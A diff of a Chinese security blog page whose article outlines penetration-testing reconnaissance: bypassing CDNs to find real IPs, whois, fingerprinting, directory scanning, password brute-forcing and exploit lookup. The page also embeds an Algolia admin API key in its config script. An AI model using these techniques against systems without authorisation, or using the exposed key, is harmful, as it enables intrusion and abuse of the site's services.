@@ -1,6 +1,6 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8"/>
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
@@ -10,16 +10,33 @@
 
   <title>渗透测试流程 | Pa55w0rd &#39;s Blog</title>
 
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="总结，持续更新   渗透千万条，安全第一条。渗透不授权，亲人泪两行！   白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!   是要在客户允许的范围内进行测试，白帽子需要有白帽子的底线！  0x00 前言渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络">
+  
+
+  <link rel="canonical" href="http://www.pa55w0rd.online/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+
+
+  <meta name="keywords" content="渗透测试,web安全">
+
+
+
+
+  <meta name="applicable-device" content="pc,mobile">
+  <meta name="renderer" content="webkit">
+
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"渗透测试流程","description":"总结，持续更新","url":"http://www.pa55w0rd.online/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","datePublished":"2018-10-19T03:14:56.000Z","dateModified":"2026-03-24T07:59:41.339Z","author":{"@type":"Person","name":"Pa55w0rd"},"publisher":{"@type":"Organization","name":"Pa55w0rd 's Blog","url":"http://www.pa55w0rd.online/","logo":{"@type":"ImageObject","url":"http://www.pa55w0rd.online/img/favicon.ico"}},"mainEntityOfPage":{"@type":"WebPage","@id":"http://www.pa55w0rd.online/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},"inLanguage":"zh-CN"}</script>
+
+
+  
+  <meta name="description" content="总结，持续更新">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透测试流程">
-<meta property="og:url" content="http://www.pa55w0rd.online/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:url" content="http://www.pa55w0rd.online/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
 <meta property="og:site_name" content="Pa55w0rd &#39;s Blog">
-<meta property="og:description" content="总结，持续更新   渗透千万条，安全第一条。渗透不授权，亲人泪两行！   白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!   是要在客户允许的范围内进行测试，白帽子需要有白帽子的底线！  0x00 前言渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络">
+<meta property="og:description" content="总结，持续更新">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2018-10-19T03:14:56.000Z">
-<meta property="article:modified_time" content="2022-03-10T09:21:44.923Z">
+<meta property="article:modified_time" content="2026-03-24T07:59:41.339Z">
 <meta property="article:author" content="Pa55w0rd">
 <meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
@@ -41,7 +58,7 @@
 
 
   
-    <link rel="alternative" href="/atom.xml" title="Pa55w0rd &#39;s Blog" type="application/atom+xml">
+    <link rel="alternate" href="/atom.xml" title="Pa55w0rd &#39;s Blog" type="application/atom+xml">
   
 
 
@@ -53,25 +70,36 @@
   
 <link rel="stylesheet" href="/css/style.css">
 
+  
+  <!-- 自定义目录样式 -->
+  
+<link rel="stylesheet" href="/assets/css/custom-toc.css">
+
+  
   <!-- <link href="/css/show.ua.css" rel="stylesheet" type="text/css" > -->
-  <link href="http://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script><![endif]-->
+  <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700&display=swap" rel="stylesheet">
+  <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script><![endif]-->
   <!-- <link href="/vendors/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" /> -->
 
   <link href="/vendors/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
 
-  <script src="/js/ua-parser.min.js" type="text/javascript"></script>
-  <script src="/js/jquery.js" type="text/javascript"></script>
-  <script src="/js/jquery.min.js" type="text/javascript"></script>
-  <script src="/js/scrollReveal.js" type="text/javascript"></script>
-  <script src="http://cdn.bootcss.com/instantsearch.js/1.5.1/instantsearch.js"></script>
-  <script src="/js/algolia-search.js" type="text/javascript"></script>
-  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script> -->
-  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
   
+  <script>
+   var CONFIG = {
+    root: '/',
+    algolia: {
+          applicationID: "W1CAX1W2FZ",
+          apiKey: "0a71809a146dcea950631aea9ef44f9c",
+          adminApiKey: "432573b0a0ab3afd374bd04484251a9b",
+          indexName: "Blog",
+          hits: {"per_page":10},
+          labels: {"input_placeholder":"搜索...","hits_empty":"未发现与 「${query}」相关的内容","hits_stats":"${hits} 条相关条目，使用了 ${time} 毫秒"}
+        }
+  };
+  </script>
+  
+
   
 <!-- Google Analytics -->
 <script type="text/javascript">
@@ -91,31 +119,6 @@ ga('send', 'pageview');
 
 
 
-
-  
-  
-  <!-- 
-  
-  
-  
-  
-  
-   -->
-
-
-  <script>
-   var CONFIG = {
-    root: '/',
-    algolia: {
-          applicationID: "W1CAX1W2FZ",
-          apiKey: "0a71809a146dcea950631aea9ef44f9c",
-          adminApiKey: "432573b0a0ab3afd374bd04484251a9b",
-          indexName: "Blog",
-          hits: {"per_page":10},
-          labels: {"input_placeholder":"搜索...","hits_empty":"未发现与 「${query}」相关的内容","hits_stats":"${hits} 条相关条目，使用了 ${time} 毫秒"}
-        }
-  };
-  </script>
 <!--
 <script>
     (function(){
@@ -128,11 +131,11 @@ ga('send', 'pageview');
     })();
   </script>
 -->
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 7.3.0"></head>
 
 
 
-<body>
+<body data-toc="on">
 <div id="container">
   <div id="wrap">
     <header id="header">
@@ -190,21 +193,37 @@ ga('send', 'pageview');
 </header>
 
     <div class="outer">
-      <section id="main"><article   id="post-渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
-  <div data-scroll-reveal="enter top and over 0.7s"  class="article-meta">
-    <a  href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
-  <i class="fa fa-calendar"></i>
-  <time  datetime="2018-10-19T03:14:56.000Z" itemprop="datePublished">2018-10-19</time>
-</a>
+      <section id="main"><article id="post-渗透测试" class="article article-type-post" itemscope itemtype="https://schema.org/BlogPosting">
+  <header data-scroll-reveal="enter top and over 0.7s" class="article-meta">
+    <div class="article-meta-primary">
+      
+<span class="article-date">
+  <i class="fa fa-calendar" aria-hidden="true"></i>
+  <time datetime="2018-10-19T03:14:56.000Z" itemprop="datePublished">2018-10-19</time>
+</span>
 
-    
+
+      
   <div class="article-category">
     <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
   </div>
 
 
-  </div>
-  <div class="article-inner"  >
+    </div>
+    
+    <div class="article-reading-aside" aria-label="字数与阅读时长">
+      <i class="fa fa-file-text-o" aria-hidden="true"></i>
+      <span class="article-wordcount">约 13.4k 字</span>
+      <span class="article-reading-time">约 50 分钟读完</span>
+    </div>
+    
+    
+    <span class="article-meta-sronly">
+      <time datetime="2026-03-24T07:59:41.339Z" itemprop="dateModified">2026-03-24</time>
+    </span>
+    
+  </header>
+  <div class="article-inner">
     
     
 
@@ -221,39 +240,6 @@ ga('send', 'pageview');
 
       </header>
     
-    <!-- <span title="{{ __('post.wordcount') }}">
-      字数统计：{{ wordcount(post.content) }} 字
-     </span>
-     <span title="{{ __('post.min2read') }}">
-      阅读时长：预计{{ min2read(post.content) }} 分钟
-    </span> -->
-    <!-- 目录内容 -->
-
-  <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
-        <span class="btn-bg"></span>
-        <span class="btn-text">文章导航</span>
-        </p>
-<div id="toc-article" class="toc-article">
-    <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
-  <strong class="toc-title">文章目录</strong>
-         <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%98%8E%E7%A1%AE%E7%9B%AE%E6%A0%87"><span class="toc-number">2.</span> <span class="toc-text">0x01 明确目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">0x02 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">5.</span> <span class="toc-text">0x04 漏洞验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5"><span class="toc-number">6.</span> <span class="toc-text">0x05 后渗透阶段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%8A%A5%E5%91%8A%E7%BC%96%E5%86%99"><span class="toc-number">7.</span> <span class="toc-text">0x06 报告编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E9%A3%8E%E9%99%A9%E8%A7%84%E9%81%BF"><span class="toc-number">8.</span> <span class="toc-text">0x07 风险规避</span></a></li></ol>
-       </div>
- <script type="text/javascript">
-function showToc(){
-  var toc_article = document.getElementById("toc-article");
-  var show_toc_btn = document.getElementById("show-toc-btn");
-  toc_article.setAttribute("style","display:block");
-  show_toc_btn.setAttribute("style","display:none");
-  };
-function showBtn(){
-  var toc_article = document.getElementById("toc-article");
-  var show_toc_btn = document.getElementById("show-toc-btn");
-  toc_article.setAttribute("style","display:none");
-  show_toc_btn.setAttribute("style","display:block");
-  };
- </script>
-    		
-<!-- 目录内容结束 -->
     <div class="article-entry" itemprop="articleBody">
       
         
@@ -281,7 +267,7 @@ function showBtn(){
 <li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权？哪些社工手段不能使用等。</li>
 <li>确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等。（立体全方位）</li>
 </ul>
-<p>不会些什么长篇大论，都是CV的，现在在甲方，渗透尽量在不影响业务系统正常运行的前提下进行一次完整的测试，需要全面测试，不能只测出来几个漏洞应付了事了。当然，版本迭代/新业务线啥的一般都是在测试环境上做了，线上的主要看有没有配置问题（服务器/中间件等安全基线这块都没做）</p>
+<p>不会些什么长篇大论，都是CV的，现在在甲方，渗透尽量在不影响业务系统正常运行的前提下进行一次完整的测试，需要全面测试，不能只测出来几个漏洞应付了事了。当然，版本迭代&#x2F;新业务线啥的一般都是在测试环境上做了，线上的主要看有没有配置问题（服务器&#x2F;中间件等安全基线这块都没做）</p>
 <h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>在对一个站进行渗透测试的过程中，信息收集是非常重要的。信息收集的详细与否可能决定着此次渗透测试的结果，知己知彼，百战不殆。</p>
 <p>信息搜集分为主动信息搜集和被动信息搜集。</p>
 <p>主动信息搜集就是通过直接访问和扫描信息的方式进行收集信息，缺点是会记录自己的操作信息；被动信息搜集就是通过第三方服务进行信息搜集，缺点是收集信息有限。</p>
@@ -292,7 +278,7 @@ function showBtn(){
 <li><p><strong>ping顶级域名或子域名</strong>，一般企业都只会对www域名做cdn，而常常忽略了空域名和子域名,确定了没有使用CDN的二级域名后，本地将目标域名绑定到同ip，能访问就说明目标站与二级域名在同一服务器，也可能在同C段，扫描C段所有开80端口的ip，挨个尝试</p>
 </li>
 <li><p><strong>查询历史dns记录</strong>,如果存在做了cdn之前的历史记录也是可以查到真实ip的，相关查询网站有：</p>
- <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>dnsdb.io<span class="regexp">/zh-cn/</span></span><br><span class="line">https:<span class="regexp">//</span>x.threatbook.cn/</span><br><span class="line">http:<span class="regexp">//</span>toolbar.netcraft.com/site_report?url=</span><br><span class="line">http:<span class="regexp">//</span>viewdns.info/</span><br><span class="line">http:<span class="regexp">//</span>whoisrequest.com<span class="regexp">/history/</span></span><br><span class="line">https:<span class="regexp">//</span>tools.ipip.net/cdn.php</span><br><span class="line">https:<span class="regexp">//</span>securitytrails.com/</span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//dnsdb.io/zh-cn/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//x.threatbook.cn/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//toolbar.netcraft.com/site_report?url=</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//viewdns.info/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//whoisrequest.com/history/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//tools.ipip.net/cdn.php</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//securitytrails.com/</span></span><br></pre></td></tr></table></figure></li>
 <li><p>DNS社工库 <em>Ps.和查询历史dns记录道理一样，没有相关的裤子</em></p>
 </li>
 <li><p>还可以使用对方的邮件服务（如注册激活邮件、找回密码），站点的sendmail功能或者是rss订阅服务，当目标给你发送了一条消息也可以从消息中找到真实ip</p>
@@ -306,7 +292,8 @@ function showBtn(){
 <li><p>通过各种漏洞或其他方式想办法让目标反向连接我们，比如命令执行反弹shell、ssrf漏洞、xss盲打后台，被动和目标数据库建立连接等等</p>
 </li>
 <li><p>使用<code>nslookup</code>或<code>dig</code>更改dns为国外的不知名的dns服务器来解析目标域名的各种记录（ns、a、mx等）可能查到其真实ip</p>
- <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">收集的部分国外dns服务器</span><br><span class="line"><span class="number">209.244.0.3</span></span><br><span class="line"><span class="number">64.6.64.6</span></span><br><span class="line"><span class="number">8.8.8.8</span></span><br><span class="line"><span class="number">9.9.9.9</span></span><br><span class="line"><span class="number">8.26.56.26</span></span><br><span class="line"><span class="number">199.85.126.10</span></span><br><span class="line"><span class="number">208.67.222.222</span></span><br><span class="line"><span class="number">195.46.39.39</span></span><br><span class="line"><span class="number">69.195.152.204</span></span><br><span class="line"><span class="number">208.76.50.50</span></span><br><span class="line"><span class="number">216.146.35.35</span></span><br><span class="line"><span class="number">37.235.1.174</span></span><br><span class="line"><span class="number">198.101.242.72</span></span><br><span class="line"><span class="number">77.88.8.8</span></span><br><span class="line"><span class="number">91.239.100.100</span></span><br><span class="line"><span class="number">74.82.42.42</span></span><br><span class="line"><span class="number">109.69.8.51</span></span><br><span class="line"><span class="number">156.154.70.1</span></span><br><span class="line"><span class="number">1.1.1.1</span></span><br><span class="line"><span class="number">45.77.165.194</span></span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">收集的部分国外dns服务器</span><br><span class="line"><span class="number">209.244.0.3</span></span><br><span class="line"><span class="number">64.6.64.6</span></span><br><span class="line"><span class="number">8.8.8.8</span></span><br><span class="line"><span class="number">9.9.9.9</span></span><br><span class="line"><span class="number">8.26.56.26</span></span><br><span class="line"><span class="number">199.85.126.10</span></span><br><span class="line"><span class="number">208.67.222.222</span></span><br><span class="line"><span class="number">195.46.39.39</span></span><br><span class="line"><span class="number">69.195.152.204</span></span><br><span class="line"><span class="number">208.76.50.50</span></span><br><span class="line"><span class="number">216.146.35.35</span></span><br><span class="line"><span class="number">37.235.1.174</span></span><br><span class="line"><span class="number">198.101.242.72</span></span><br><span class="line"><span class="number">77.88.8.8</span></span><br><span class="line"><span class="number">91.239.100.100</span></span><br><span class="line"><span class="number">74.82.42.42</span></span><br><span class="line"><span class="number">109.69.8.51</span></span><br><span class="line"><span class="number">156.154.70.1</span></span><br><span class="line"><span class="number">1.1.1.1</span></span><br><span class="line"><span class="number">45.77.165.194</span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>让服务器去访问你的vps，比如说这个网址有设置头像的方式，并且可以直接填写头像的url，或者插入远程图片，那么我们可以把图片放在自己vps上提交给服务器，那么也可以从日志中得到真实ip</p>
 </li>
 <li><p>DDOS，耗尽CDN流量，回源之后找到真实ip。不设防的cdn量大就会挂，高防CDN要增大流量 <em>Ps.没有资源，现在防ddos也比较强，没尝试过</em></p>
@@ -315,14 +302,12 @@ function showBtn(){
 </li>
 <li><p>全网扫描zmap，使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host字段匹配相关域名 <em>Ps.因造成网络拥堵，后续没有尝试</em></p>
 </li>
-<li><p>通过shadan/zoomeye/fofa搜索网站特殊标题、内容、网站源码</p>
+<li><p>通过shadan&#x2F;zoomeye&#x2F;fofa搜索网站特殊标题、内容、网站源码</p>
 </li>
 <li><p>cloudflare，如<a target="_blank" rel="noopener" href="https://github.com/m0rtem/CloudFail">CloudFail</a>、<a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/41533.html">CloudFlare防护下的破绽：寻找真实IP的几条途径</a>、<a target="_blank" rel="noopener" href="http://crimeflare.net:83/cfssl.html">http://crimeflare.net:83/cfssl.html(需要翻墙)</a></p>
 </li>
 </ol>
 </li>
-</ul>
-<ul>
 <li><p>whois信息查询</p>
 <p>  当拿到一个域名的时候，我们首先应该进行whois查询，可以使kali 下面的 whois命令或者使用<a target="_blank" rel="noopener" href="http://whois.chinaz.com/">chinaz在线工具</a>，whois信息可以获取关键注册人的信息，包括注册公司、注册邮箱、管理员邮箱、管理员联系手机等,对后期社工很有用，还可以查询同一注册人注册的其他的域名，域名对应的NS记录、MX记录，自动识别国内常见的托管商（万网、新网等）。或者我们可以有针对性的利用其信息生成字典，对后台或者其他登录功能进行爆破。</p>
 <p>  who.is：<a target="_blank" rel="noopener" href="https://who.is/">https://who.is/</a> </p>
@@ -336,17 +321,17 @@ function showBtn(){
 <li><p>旁站C段查询</p>
 <p>  旁站是和目标网站在同一台服务器上的其它的网站；如果从目标站本身找不到好的入手点，这时候，如果想快速拿下目标的话，一般都会先找个目标站点所在服务器上其他的比较好搞的站下手，然后再想办法跨到真正目标的站点目录中。C段是和目标机器ip处在同一个C段的其它机器；通过目标所在C段的其他任一台机器，想办法跨到我们的目标机器上。常用的工具有<a target="_blank" rel="noopener" href="http://www.cnblogs.com/dongchi/p/4155368.html">ip反查</a>，Nmap，Zenmap。</p>
 </li>
-<li><p>指纹识别/网站架构探测</p>
-<p>  通过指纹识别，我们可以明确这个网站服务器是用什么操作系统（win/linux）<br></p>
+<li><p>指纹识别&#x2F;网站架构探测</p>
+<p>  通过指纹识别，我们可以明确这个网站服务器是用什么操作系统（win&#x2F;linux）<br></p>
 <ul>
 <li>TTL</li>
 <li>路径大小写</li>
-<li>访问不存在的页面<br>针对一个web服务，我们应该首先明确这个是由什么语言开发的前后端，常见脚本语言有php/asp/aspx/jsp等</li>
+<li>访问不存在的页面<br>  针对一个web服务，我们应该首先明确这个是由什么语言开发的前后端，常见脚本语言有php&#x2F;asp&#x2F;aspx&#x2F;jsp等</li>
 <li>respone包头</li>
-<li>index.php/index.jsp/index.asp</li>
+<li>index.php&#x2F;index.jsp&#x2F;index.asp</li>
 <li>爬虫爬取网站结构，看xx.jsp?等</li>
 </ul>
-<p>  使用的什么webserver版本和类型，因为不同的webserver也有不同的解析漏洞或者其他的漏洞，常见的服务器包括apache/tomcat/iis/nginx。<br></p>
+<p>  使用的什么webserver版本和类型，因为不同的webserver也有不同的解析漏洞或者其他的漏洞，常见的服务器包括apache&#x2F;tomcat&#x2F;iis&#x2F;nginx。<br></p>
 <ul>
 <li>使用浏览器插件(wappalyzer)可以很方便的查看这些信息<br></li>
 <li>使用nc 或telnet 可以观察数据包特征或者网页加载的特殊文件来识别cms，如<code>nc xxx.com 80</code></li>
@@ -356,11 +341,11 @@ function showBtn(){
 <li>HTTP 标头 ，如 X-Powered-By 字段</li>
 <li>cookie </li>
 <li>HTML 源代码</li>
-<li>特定文件和文件夹，例如/templets/default/style/dedecms.css — dedecms</li>
+<li>特定文件和文件夹，例如&#x2F;templets&#x2F;default&#x2F;style&#x2F;dedecms.css — dedecms</li>
 <li>网站独有文件的md5，例如favicon.ico</li>
-<li>网站命名规则；返回头的关键字；网页关键字；URL特征；Meta特征；Script特征；robots.txt；网站路径特征；网站静态资源；爬取网站目录信息等<br>是否用了某种开源程序cms，然后我们可以利用公开的对应版本的poc、默认的后台登录页/数据库服务端口认证等进行测试，当然我们也可以将对应版本的源码下载下来进行代码审计。<br><br>用什么框架开发的，如Thinkphp、struts2，很多网站都利用开源的框架来快速开发网站，所以收集网站的框架信息也是非常关键的。 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">开源的软件</span><br><span class="line"></span><br><span class="line">常见的开源软件有：wordpress、phpbb、dedecms等</span><br><span class="line">开源的框架</span><br><span class="line"></span><br><span class="line">常见的开源框架有：Struts2、 Spring MVC、ThinkPHP等</span><br><span class="line">中间件服务器</span><br><span class="line"></span><br><span class="line">常见的中间件服务器有：<span class="keyword">jboss、tomcat、Weblogic等</span></span><br><span class="line"><span class="keyword"></span>数据库服务</span><br><span class="line"></span><br><span class="line">常见的数据库服务：mssql、mysql、<span class="keyword">oracle、redis、sybase、MongoDB、DB2等 </span></span><br></pre></td></tr></table></figure></li>
+<li>网站命名规则；返回头的关键字；网页关键字；URL特征；Meta特征；Script特征；robots.txt；网站路径特征；网站静态资源；爬取网站目录信息等<br>  是否用了某种开源程序cms，然后我们可以利用公开的对应版本的poc、默认的后台登录页&#x2F;数据库服务端口认证等进行测试，当然我们也可以将对应版本的源码下载下来进行代码审计。<br><br>  用什么框架开发的，如Thinkphp、struts2，很多网站都利用开源的框架来快速开发网站，所以收集网站的框架信息也是非常关键的。</li>
 </ul>
-</li>
+  <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">开源的软件</span><br><span class="line"></span><br><span class="line">常见的开源软件有：wordpress、phpbb、dedecms等</span><br><span class="line">开源的框架</span><br><span class="line"></span><br><span class="line">常见的开源框架有：Struts2、 Spring MVC、ThinkPHP等</span><br><span class="line">中间件服务器</span><br><span class="line"></span><br><span class="line">常见的中间件服务器有：<span class="keyword">jboss、tomcat、Weblogic等</span></span><br><span class="line"><span class="keyword"></span>数据库服务</span><br><span class="line"></span><br><span class="line">常见的数据库服务：mssql、mysql、<span class="keyword">oracle、redis、sybase、MongoDB、DB2等 </span></span><br></pre></td></tr></table></figure></li>
 </ul>
 <p>  是否使用负载均衡，负载均衡是通过在多个服务器中分割WEB流量，来确保单个服务器的请求不会超载，一般不可见，但是有可能极大的改变渗透测试的进程。当发出请求的时候，负载均衡可能将请求交给其中的一个服务器来处理。每个服务器的应用结构虽然相同，但是文件夹不同、补丁级别不同及其他配置可能完全不同</p>
 <ul>
@@ -386,8 +371,8 @@ function showBtn(){
 <li><p>利用app进行信息收集</p>
 <p>  可以利用工具对其进行逆向，找出其所使用的url链接，然后进行专门的渗透测试</p>
 </li>
-<li><p>敏感目录/文件</p>
-<p>  敏感目录包括但不限于网站的敏感文件（.mdb,.excel,.word,.zip,.rar），各类web入口（后台、控制台弱口令、爆破）、未授权访问的上传页面，文本编辑器、robots.txt、.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露或者phpmyadmin等等目录。<br>就拿备份文件来讲，一般人拿到以后只会查看是否有数据库账号密码进行连接，如果没有就无从下手,其实我们可以通过代码审计发现它的漏洞进行渗透测试。再比如phpmyadmin，我们可以使用爆破工具对其账号密码进行爆破。或者是之前有黑阔留下的后门文件，我们也可以爆破其密码进行利用。<br>目录扫描有两种方式，使用目录字典进行暴力才接存在该目录或文件返回200或者403；使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。常用工具<a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a>、御剑、wwwscan、<a target="_blank" rel="noopener" href="https://github.com/lijiejie/BBScan">BBscan</a>、爬虫等发现或爆破发现隐藏页面，增加攻击面</p>
+<li><p>敏感目录&#x2F;文件</p>
+<p>  敏感目录包括但不限于网站的敏感文件（.mdb,.excel,.word,.zip,.rar），各类web入口（后台、控制台弱口令、爆破）、未授权访问的上传页面，文本编辑器、robots.txt、.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF&#x2F;web.xml泄露或者phpmyadmin等等目录。<br>就拿备份文件来讲，一般人拿到以后只会查看是否有数据库账号密码进行连接，如果没有就无从下手,其实我们可以通过代码审计发现它的漏洞进行渗透测试。再比如phpmyadmin，我们可以使用爆破工具对其账号密码进行爆破。或者是之前有黑阔留下的后门文件，我们也可以爆破其密码进行利用。<br>目录扫描有两种方式，使用目录字典进行暴力才接存在该目录或文件返回200或者403；使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。常用工具<a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a>、御剑、wwwscan、<a target="_blank" rel="noopener" href="https://github.com/lijiejie/BBScan">BBscan</a>、爬虫等发现或爆破发现隐藏页面，增加攻击面</p>
 </li>
 <li><p>端口信息</p>
 <p>  服务和安全是相对应的，每开启一个端口，那么攻击面就大了一点，开启的端口越多，也就意味着服务器面临的威胁越大，如服务配置错误、服务自身漏洞利用、弱口令等。当拿到一个ip的时候，我们一般都需要使用nmap或者其他同类扫描工具如masscan对其开放端口以及端口对应的服务和版本信息进行扫描。通过端口开放情况，我们可以针对性的对其进行渗透测试</p>
@@ -395,7 +380,7 @@ function showBtn(){
 <p>  关键的操作就是确定端口后边的软件及软件版本，然后去个漏洞库去查找其存在的漏洞乃至exp<br>  搜索漏洞信息</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="http://www.cvedetails.com/version-search.php">CVE漏洞库搜索</a></li>
-<li><a target="_blank" rel="noopener" href="http://cve.mitre.org/cve/search_cve_list.html">mitre_cve漏洞信息搜索</a><br>通过cve获取exp</li>
+<li><a target="_blank" rel="noopener" href="http://cve.mitre.org/cve/search_cve_list.html">mitre_cve漏洞信息搜索</a><br>  通过cve获取exp</li>
 <li>通过metasploit搜索<code>msf&gt; search cve:2018-xxxx</code></li>
 <li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/search/">exploit-db</a></li>
 <li>github搜索</li>
@@ -407,7 +392,7 @@ function showBtn(){
 <thead>
 <tr>
 <th>端口号</th>
-<th>端口服务/协议简要说明</th>
+<th>端口服务&#x2F;协议简要说明</th>
 <th>关于端口可能的一些渗透用途</th>
 </tr>
 </thead>
